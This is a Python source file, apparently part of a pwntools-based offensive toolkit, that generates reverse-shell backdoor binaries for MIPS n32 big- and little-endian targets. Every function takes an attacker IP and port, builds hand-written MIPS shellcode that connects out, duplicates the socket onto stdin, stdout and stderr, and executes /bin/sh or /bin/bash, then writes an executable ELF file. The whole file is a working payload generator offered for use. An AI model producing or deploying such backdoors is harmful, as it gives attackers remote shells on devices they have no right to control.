from pwn import *
from . import my_package
#import my_package
import subprocess
from colorama import Fore,Back,Style

chars = my_package.chars


'''
mipsn32 backdoor
add 2023.2.26
socket 1798
connect 0x1799
dup2 0x1790
execve 0x0017a9
'''


def mipsn32_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
    if(my_package.get_mipsn32_binutils() == 1):
        return 
    context.architectures['mipsn32'] = {'endian': 'big', 'bits': 32}
    context.arch = 'mipsn32'
    context.endian = "big"
    context.bits = "32"
    log.success("reverse_ip is: "+ reverse_ip)
    log.success("reverse_port is: "+str(reverse_port))
    reverse_port = int(hex(reverse_port), 16)
    reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
    reverse_ip = list(reverse_ip.split("."))
    reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
    # print(reverse_ip_high)
    # print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
    # print(reverse_ip_high)
    reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
    shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
    """
    shellcode_connect = '''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x1798
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, 0xfffd
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x1799
syscall 0x40404
    '''
    shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_high,reverse_ip_low)

    shellcode_dup_sh='''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x1790
syscall 0x40404
	'''
    if shell_path == "/bin/sh" or shell_path == "sh":
        shellcode_execve = """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -8($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t9, 0xd08c
ori     $t9, $t9, 0x97ff
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, 0xd296
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """

    elif shell_path == "/bin/bash" or shell_path == "bash":
        shellcode_execve = """
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -12($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -8($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xffff
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x2f62
ori     $t1, $t1, 0x696e
sw      $t1, -16($sp)
lui     $t1, 0x2f62
ori     $t1, $t1, 0x6173
sw      $t1, -12($sp)
lui     $t9, 0x97ff
ori     $t9, $t9, 0xd296
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """

    else:
        log.info("now shell is only support sh and bash")
        return 
    if(envp == None):
        envp = 0
    else:
        envp = my_package.get_envir_args(envp)
    shellcode += shellcode_connect + shellcode_dup_sh +shellcode_execve
    if (filename == None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
        my_package.my_make_add_arch_elf(shellcode, filename)
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            my_package.my_make_add_arch_elf(shellcode, filename)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
            return 
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                my_package.my_make_add_arch_elf(shellcode, filename)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
                return 
            else:
                return
    #my_package.my_make_add_arch_elf(shellcode)



def mipsn32el_backdoor(shell_path ,reverse_ip,reverse_port, envp ,filename=None):
    if(my_package.get_mipsn32_binutils() == 1):
        return 
    context.architectures['mipsn32el'] = {'endian': 'little', 'bits': 32}
    context.arch = 'mipsn32el'
    context.endian = "little"
    context.bits = "32"
    log.success("reverse_ip is: "+ reverse_ip)
    log.success("reverse_port is: "+str(reverse_port))
    reverse_port=int(hex(reverse_port),16)
    reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
    reverse_ip=list(reverse_ip.split("."))
    reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
    #print(reverse_ip_high)
    #print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
    #print(reverse_ip_high)
    reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
    shellcode = """
.section .shellcode,"awx"
.global _start
.global __start
.p2align 2
_start:
__start:
    """
    shellcode_connect='''
li      $t9, -3
nor     $a0, $t9, $zero
li      $t9, -3
nor     $a1, $t9, $zero
slti    $a2, $zero, -1
li      $v0, 0x13b0
syscall 0x40404
sw      $v0, -4($sp)
lw      $s0, -4($sp)
lui     $t9, %s
ori     $t9, $t9, 0xfffd
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
lui     $t9, %s
ori     $t9, $t9, %s
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu  $sp, $sp, -8
sw      $s0, -4($sp)
lw      $a0, -4($sp)
move     $a1,$sp
li      $t9, -17
nor     $a2, $t9, $zero
li      $v0, 0x13b1
syscall 0x40404
    '''
    shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)
    shellcode_dup_sh='''
move $a0,$s0
nor $a1,$zero,-1
li  $v0,0x13A8
syscall 0x40404
move $a0,$s0
li  $t9,-2
nor $a1,$t9,$zero
li  $v0,0x13A8
syscall 0x40404
move $a0,$s0
li  $t9,-3
nor $a1,$t9,$zero
li  $v0,0x13A8
syscall 0x40404
    '''
    if shell_path == "/bin/sh" or shell_path=="sh":
        shellcode_execve = """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -8
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0xff97
ori     $t9, $t9, 0x8cd0
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
li      $t1, 0x692d
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -13
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """
    elif shell_path == "/bin/bash" or shell_path == "bash":
        shellcode_execve = """
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -8($sp)
li      $t9, -105
nor     $t1, $t9, $zero
sw      $t1, -4($sp)
addiu   $sp, $sp, -12
add     $a0, $sp, $zero
lui     $t1, 0x6e69
ori     $t1, $t1, 0x622f
sw      $t1, -16($sp)
lui     $t1, 0x7361
ori     $t1, $t1, 0x622f
sw      $t1, -12($sp)
lui     $t9, 0x96d2
ori     $t9, $t9, 0xff97
nor     $t1, $t9, $zero
sw      $t1, -8($sp)
sw      $zero, -4($sp)
addiu   $sp, $sp, -16
slti    $a1, $zero, -1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -15
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
li      $t9, -9
nor     $a1, $t9, $zero
add     $a1, $sp, $a1
sw      $a1, -4($sp)
addi    $sp, $sp, -4
add     $a1, $sp, $zero
slti    $a2, $zero, -1
li      $v0, 0x0017a9
syscall 0x40404
        """
    else:
        log.info("now shell is only support sh and bash")
        return 
    if(envp == None):
        envp = 0
    else:
        envp = my_package.get_envir_args(envp)

    shellcode += shellcode_connect + shellcode_dup_sh +shellcode_execve
    if (filename == None):
        log.info("waiting 3s")
        sleep(1)
        filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
        my_package.my_make_add_arch_elf(shellcode, filename)
        os.chmod(filename, 0o755)
        log.success("{} is ok in current path ./".format(filename))
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            my_package.my_make_add_arch_elf(shellcode, filename)
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
            return 
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                my_package.my_make_add_arch_elf(shellcode, filename)
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
                return 
            else:
                return

#mipsn32_backdoor("sh", "127.0.0.1", 8888, None,)